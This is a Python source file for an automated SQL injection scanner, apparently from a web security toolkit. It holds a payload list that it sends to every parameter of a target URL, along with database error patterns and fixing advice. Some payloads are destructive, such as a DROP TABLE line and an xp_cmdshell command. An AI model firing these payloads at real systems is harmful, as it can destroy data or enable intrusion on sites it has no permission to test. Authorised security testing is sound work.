"""SQL Injection Scanner Tool - Tests for SQL injection vulnerabilities."""

import time
import requests
from datetime import datetime
from typing import List, Dict
from urllib.parse import urlparse, parse_qs, urlencode
try:
    from .schemas import SQLInjectionScannerInput, SQLInjectionScannerOutput, SQLInjectionResult
except ImportError:
    from schemas import SQLInjectionScannerInput, SQLInjectionScannerOutput, SQLInjectionResult

# SQL injection payloads for different database types
SQL_PAYLOADS = [
    # Error-based payloads
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "\" OR 1=1--",
    "'; DROP TABLE users--",
    "'; EXEC xp_cmdshell('dir')--",
    
    # Union-based payloads
    "' UNION SELECT NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    
    # Boolean-based payloads
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    
    # Time-based payloads
    "'; WAITFOR DELAY '00:00:05'--",
    "'; SELECT SLEEP(5)--",
    "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY CONCAT(MID(version(),1,50),FLOOR(RAND(0)*2)))a)--",
    
    # MySQL specific
    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    
    # PostgreSQL specific
    "'; SELECT pg_sleep(5)--",
    "' AND (SELECT COUNT(*) FROM pg_stat_activity)>0--",
    
    # MSSQL specific
    "'; EXEC('SELECT @@version')--",
    "' AND (SELECT COUNT(*) FROM sys.databases)>0--",
    
    # Oracle specific
    "' AND (SELECT COUNT(*) FROM user_tables)>0--",
    "' UNION SELECT NULL FROM dual--"
]

# Error patterns that indicate SQL injection vulnerability
ERROR_PATTERNS = [
    "mysql_fetch",
    "ora-01756",
    "microsoft ole db provider",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql server",
    "mysql server",
    "postgresql",
    "oracle error",
    "sqlite error",
    "sql syntax",
    "mysql_query",
    "mysql_num_rows",
    "pg_query",
    "pg_exec",
    "sqlite_query",
    "error in your sql syntax",
    "warning: mysql",
    "warning: pg_",
    "warning: sqlite_",
    "invalid query",
    "sql command not properly ended",
    "unexpected end of sql command"
]

def test_sql_injection(url: str, method: str, param_name: str, param_value: str, payload: str, headers: Dict, timeout: int) -> SQLInjectionResult:
    """Test a single SQL injection payload."""
    start_time = time.time()
    
    try:
        if method.upper() == "GET":
            # Parse URL and modify parameter
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            params[param_name] = [payload]
            new_query = urlencode(params, doseq=True)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
            
            response = requests.get(test_url, headers=headers, timeout=timeout)
        else:
            # POST request
            data = {param_name: payload}
            response = requests.post(url, data=data, headers=headers, timeout=timeout)
        
        response_time = time.time() - start_time
        response_text = response.text.lower()
        
        # Check for error patterns
        vulnerable = False
        error_message = None
        
        for pattern in ERROR_PATTERNS:
            if pattern in response_text:
                vulnerable = True
                error_message = f"Database error pattern detected: {pattern}"
                break
        
        # Check for time-based injection (response time > 4 seconds indicates possible time-based SQLi)
        if response_time > 4 and any(keyword in payload.lower() for keyword in ["sleep", "waitfor", "delay"]):
            vulnerable = True
            error_message = f"Time-based SQL injection detected (response time: {response_time:.2f}s)"
        
        return SQLInjectionResult(
            parameter=param_name,
            payload=payload,
            vulnerable=vulnerable,
            error_message=error_message,
            response_time=response_time
        )
        
    except Exception as e:
        response_time = time.time() - start_time
        return SQLInjectionResult(
            parameter=param_name,
            payload=payload,
            vulnerable=False,
            error_message=f"Request failed: {str(e)}",
            response_time=response_time
        )

def execute_tool(input_data: SQLInjectionScannerInput) -> SQLInjectionScannerOutput:
    """Execute the SQL injection scanner tool."""
    timestamp = datetime.now()
    results = []
    
    # Default headers
    headers = input_data.headers or {}
    if "User-Agent" not in headers:
        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    
    # Extract parameters from URL if not provided
    parameters = input_data.parameters or {}
    if not parameters and "?" in input_data.target_url:
        parsed_url = urlparse(input_data.target_url)
        parameters = dict(parse_qs(parsed_url.query))
        # Convert list values to single values
        parameters = {k: v[0] if isinstance(v, list) else v for k, v in parameters.items()}
    
    # If no parameters found, create a default test parameter
    if not parameters:
        parameters = {"id": "1"}
    
    # Test each parameter with each payload
    for param_name, param_value in parameters.items():
        for payload in SQL_PAYLOADS:
            result = test_sql_injection(
                input_data.target_url,
                input_data.method,
                param_name,
                param_value,
                payload,
                headers,
                input_data.timeout
            )
            results.append(result)
    
    # Count vulnerabilities
    vulnerabilities_found = sum(1 for result in results if result.vulnerable)
    
    # Generate recommendations
    recommendations = [
        "Use parameterized queries (prepared statements)",
        "Implement input validation and sanitization",
        "Use stored procedures with proper parameter handling",
        "Apply the principle of least privilege for database accounts",
        "Enable SQL injection detection in WAF",
        "Regular security code reviews and penetration testing"
    ]
    
    if vulnerabilities_found > 0:
        recommendations.insert(0, "CRITICAL: SQL injection vulnerabilities detected - patch immediately!")
        recommendations.insert(1, "Review all user input handling in the application")
    
    return SQLInjectionScannerOutput(
        target_url=input_data.target_url,
        timestamp=timestamp,
        total_tests=len(results),
        vulnerabilities_found=vulnerabilities_found,
        results=results,
        recommendations=recommendations
    )

# Tool metadata
TOOL_INFO = {
    "name": "sql_injection_scanner",
    "display_name": "SQL Injection Scanner",
    "description": "Tests web applications for SQL injection vulnerabilities",
    "version": "1.0.0",
    "author": "Wildbox Security Team",
    "category": "web_security"
}
